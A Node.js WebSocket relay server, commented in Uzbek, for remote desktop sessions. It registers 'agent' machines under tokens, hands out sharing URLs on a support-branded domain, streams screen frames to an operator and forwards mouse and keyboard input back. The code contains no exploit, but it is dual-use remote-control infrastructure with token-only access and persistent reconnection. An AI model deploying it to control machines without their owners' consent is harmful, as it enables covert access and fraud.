const express = require('express');
const http = require('http');
const { Server } = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new Server({ server });

app.use(express.static(path.join(__dirname, 'public')));

// token -> { agentWs, viewerWs, agentName }
const sessions = new Map();

app.get('/sharing', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

wss.on('connection', (ws) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (message, isBinary) => {
        // 1. Agentdan kelgan Binary kadrni darhol Viewer (operator)ga yo'naltirish
        if (isBinary) {
            const session = sessions.get(ws.sessionToken);
            if (session && session.viewerWs && ws.clientRole === 'agent') {
                session.viewerWs.send(message, { binary: true });
            }
            return;
        }

        try {
            const data = JSON.parse(message);

            // 1. Asosiy Agent birinchi marta ro'yxatdan o'tishi
            if (data.type === 'register-agent') {
                const token = uuidv4().replace(/-/g, '') + uuidv4().replace(/-/g, '');
                const agentName = data.hostname || 'REMOTE-PC';
                
                sessions.set(token, { agentWs: ws, viewerWs: null, agentName: agentName });
                ws.sessionToken = token;
                ws.clientRole = 'agent';

                const sharingUrl = 'https://admin.falconsupportsession.com/sharing?c=' + token;

                ws.send(JSON.stringify({
                    type: 'registered',
                    sharingUrl: sharingUrl
                }));

                console.log('\n========================================');
                console.log(`KOMPYUTER ULANDI: [ ${agentName} ]`);
                console.log(`SHARING URL: ${sharingUrl}`);
                console.log('========================================\n');
            }

            // 1.1. Agent internet o'chib yonganda eski tokeni bilan qayta ulanishi
            if (data.type === 'register-agent-back') {
                let session = sessions.get(data.token);
                if (!session) {
                    session = { agentWs: ws, viewerWs: null, agentName: data.hostname || 'REMOTE-PC' };
                    sessions.set(data.token, session);
                } else {
                    session.agentWs = ws;
                    if (data.hostname) session.agentName = data.hostname;
                }

                ws.sessionToken = data.token;
                ws.clientRole = 'agent';

                const sharingUrl = 'https://admin.falconsupportsession.com/sharing?c=' + data.token;
                
                console.log('\n----------------------------------------');
                console.log(`AGENT QAYTA ULANDI: [ ${session.agentName} ]`);
                console.log(`SHARING URL: ${sharingUrl}`);
                console.log('----------------------------------------\n');

                ws.send(JSON.stringify({
                    type: 'registered',
                    sharingUrl: sharingUrl
                }));
            }

            // 3. Viewer (Operator) ulanishi
            if (data.type === 'join-viewer') {
                let session = sessions.get(data.token);
                if (session) {
                    session.viewerWs = ws;
                    ws.sessionToken = data.token;
                    ws.clientRole = 'viewer';
                    
                    ws.send(JSON.stringify({ 
                        type: 'joined-success', 
                        agentName: session.agentName || 'REMOTE-PC' 
                    }));
                    console.log(`[OPERATOR KIRDI] Kompyuter: ${session.agentName}`);
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Session not found!' }));
                }
            }

            // 4. Stream boshlash (TO'G'RILANGAN QISM: signal to'g'ri agentWs ga boradi)
            if (data.type === 'start-stream') {
                const session = sessions.get(ws.sessionToken);
                if (session && session.agentWs) {
                    session.viewerWs = ws;
                    session.agentWs.send(JSON.stringify({ type: 'start-stream' }));
                    console.log(`[STREAM] Boshlandi: ${session.agentName}`);
                }
            }

            // 5. Seansni uzish
            if (data.type === 'disconnect-session') {
                const session = sessions.get(ws.sessionToken);
                if (session && session.viewerWs === ws) {
                    if (session.agentWs) {
                        session.agentWs.send(JSON.stringify({ type: 'disconnected' }));
                    }
                    session.viewerWs = null;
                    console.log(`[OPERATOR CHIQDI] Kompyuter: ${session.agentName}`);
                }
            }

            // 7. Sichqoncha va klaviatura buyruqlari
            if (data.type === 'input') {
                const session = sessions.get(ws.sessionToken);
                if (session && ws.clientRole === 'viewer' && session.agentWs) {
                    session.agentWs.send(message);
                }
            }
        } catch (e) {
            console.error('Server error:', e);
        }
    });

    ws.on('close', () => {
        sessions.forEach((session) => {
            if (session.agentWs === ws) {
                session.agentWs = null;
                console.log(`[AGENT UZILDI] Kompyuter: ${session.agentName} (Token saqlandi)`);
            } else if (session.viewerWs === ws) {
                session.viewerWs = null;
            }
        });
    });
});

const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

wss.on('close', () => {
    clearInterval(interval);
});

const PORT = 3030;
server.listen(PORT, () => {
    console.log('Server is running on port ' + PORT);
});